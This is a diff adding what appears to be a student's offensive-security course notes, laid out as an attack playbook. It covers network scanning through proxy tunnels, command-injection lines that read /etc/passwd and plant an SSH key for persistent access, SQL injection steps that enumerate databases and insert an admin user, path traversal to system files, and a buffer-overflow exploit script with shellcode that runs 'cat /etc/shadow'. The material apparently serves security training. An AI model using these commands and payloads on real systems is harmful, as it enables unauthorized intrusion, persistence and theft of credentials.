@@ -1,0 +1,213 @@
+Recon
+
+
+1. Identify Live hosts
+	- When given a previously unknown IP, ping sweep the whole range.
+
+	- Must be run from current (Jump box or  more inernal box)
+
+
+    Linux: for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) 2>/dev/null ;done
+
+    Windows: for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.
+
+
+2. Identify open ports on Live hosts:
+	- set up dynamic tunnel from lin ops to target space
+	- RUN FOM LINOPS THROUGH DYNAMIC TUNNER (proxychains, -D 9050)
+	- Only target IPs already determined to be alive
+	- (proxychains [if scanning an internal IP]) nmap -Pn -sT xxx.xxx.xx.xxx -p 1-10000
+
+3. port interrogation an open ports : 
+	- Run from LINOPS through dynamic tunnel
+	- only target IP/Ports already determined to be open
+	- (proxychains [if scanning an internal IP]) nmap -Pn -sV 10.50.15.67 -p 22,80,8080
+
+4. NMAP scripts against known services:
+	-Theres probably an NMAP script for it!
+	- Run from linops tunnnel
+	- nmap -Pn -sT 10.50.15.67 -p 80 --script http-enum
+
+
+
+
+Web exploitation
+
+
+
+
+
+
+
+
+
+
+
+wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://"website"
+
+
+proxychains nmap -Pn -T5 -sT -p 80 --script http-enum.nse <IP>
+
+proxychains nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse <IP>
+
+proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse <IP>
+
+
+; cat /etc/passwd | grep www-data
+
+;ls -la var/www
+
+; mkdir /var/www/.ssh
+
+; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDqjPHP+SnWRrMuM9u1F6dr7Vo/OzhLUUypNFIX8rWCWVCN9kfOaME3KiP5BE1uHn6vXNCq/HLJTNNoAYDrgg7TWPWfMdCYNp37Ke0nBM+krFqq0L7N7Mr/UGMdmQQE3j9r64tRsrCHlWlZYVOA4J4kYI4E8XgMS75tZduwvQ/DkTG9GfpEwjJ99KqEz7DPCX6NCyhUBmso37BggjJp3RIGGcieXjwh3eAizADKVNpkhllQqY3gnSx6rawJ7Z9dm3Yg/Qsb1PssBh71uw3ns99Ma8H/DVLpQYsoBDii4BFBqF08E3zJPjqPPQVWNtWR/kUFAfPIqTGqB+vTGzk+lLLF student@lin-ops"
+
+
+
+
+
+
+WEB day 2
+
+when looking into SQL databases dont worry about schema and mysql database as they will not provide the informaion we need for querying user data
+
+use information_schema to query it for data that will enumerate the session database
+
+
+EX of sql database cmd.    MariaDB [(none)]> SELECT * FROM session.car;
+
+
+session is the DB and car is the table commands must end in ;
+
+
+
+
+USE session - drops into the data bas so whole path isnt needed
+
+MARIADB [session]> DESCRIBE car;
+
+
+if the field says INT it will ONLY accept numers
+
+
+SELECT * FROM car UNION SELECT * FROM tires
+
+
+you will not need to log onto sql server
+
+GOLDEN STATEMENT 
+
+
+union select table_schema, table_name, column_name from information_schema.columns
+
+make admin user
+
+INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('hacker', 'bob','Z','k','j',1)
+
+
+
+
+
+Dealing with columns when doing sql injections
+
+1.{vulnerable value}' or 1='1 (this is truth statement)
+2.{vulnerable value} union select 1,2,3,... until you figure out how many columns
+3.{vulnerable value} union select table_schema,table_name,column_name from inormation_schema.columns
+4.{vulnerable value} union select {column1,column2,column3} from {database}.{table}
+5.$$$
+
+table_schema = gives name of databases
+
+table_name = gives name of tables
+
+column_name = gives name of column
+
+
+
+
+../../../../../../etc/passwd - names of hosts
+
+../../../../../../etc/host - identify neighbor networks
+
+
+
+
+
+
+Exploit Dev:
+
+nano exploit.py
+
+
+buffer = "A" * 62
+
+#eip = "BBBB"
+eip = "\x59\x4b\xde\xf7"
+
+#0xf7de4b59
+#0xf7f598ab
+#0xf7f655fb
+
+nop = '\x90' * 20
+
+
+# AppendExit=false, CMD=cat /etc/shadow, NullFreeVersion=false
+buf =  b""
+buf += b"\xeb\x23\x5b\x89\xdf\xb0\xde\xfc\xae\x75\xfd\x89"
+buf += b"\xf9\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\xe5"
+buf += b"\x31\x74\x08\x46\x80\x3e\xde\x75\xee\xeb\xea\xff"
+buf += b"\xe1\xe8\xd8\xff\xff\xff\x02\xde\x68\x09\x5a\x9b"
+buf += b"\x50\x64\x6a\x2f\x61\x8b\xe5\x6a\x2d\x71\x6a\x02"
+buf += b"\x6a\x2d\x60\x6b\x6c\x8b\xe1\x50\xea\x12\x02\x02"
+buf += b"\x02\x61\x63\x76\x22\x2d\x67\x76\x61\x2d\x71\x6a"
+buf += b"\x63\x66\x6d\x75\x02\x55\x51\x8b\xe3\xcf\x82\xe5"
+buf += b"\x31"
+
+print(buffer + eip + nop + buf)
+
+
+
+
+
+
+
+using metasploit:
+
+msfconsole
+
+show options
+
+set cmd cat /etc/shadow
+
+show options
+
+generate -b "\x00\x20\x0a\x0d\x03" -f python
+
+
+grab this section:
+
+# AppendExit=false, CMD=cat /etc/shadow, NullFreeVersion=false
+buf =  b""
+buf += b"\xeb\x23\x5b\x89\xdf\xb0\xde\xfc\xae\x75\xfd\x89"
+buf += b"\xf9\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\xe5"
+buf += b"\x31\x74\x08\x46\x80\x3e\xde\x75\xee\xeb\xea\xff"
+buf += b"\xe1\xe8\xd8\xff\xff\xff\x02\xde\x68\x09\x5a\x9b"
+buf += b"\x50\x64\x6a\x2f\x61\x8b\xe5\x6a\x2d\x71\x6a\x02"
+buf += b"\x6a\x2d\x60\x6b\x6c\x8b\xe1\x50\xea\x12\x02\x02"
+buf += b"\x02\x61\x63\x76\x22\x2d\x67\x76\x61\x2d\x71\x6a"
+buf += b"\x63\x66\x6d\x75\x02\x55\x51\x8b\xe3\xcf\x82\xe5"
+buf += b"\x31"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
